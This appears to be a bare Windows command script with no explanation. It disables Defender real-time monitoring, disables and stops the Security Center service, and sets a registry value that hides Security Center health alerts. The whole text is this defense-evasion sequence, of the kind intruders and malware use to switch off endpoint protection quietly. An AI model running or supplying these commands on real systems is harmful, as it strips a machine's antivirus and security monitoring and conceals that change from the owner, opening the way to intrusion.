Set-MpPreference -DisableRealtimeMonitoring $true
cmd /c sc config wscsvc start= disabled
cmd /c sc stop wscsvc
cmd /c REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer /f /v HideSCAHealth /t REG_SZ /d 1

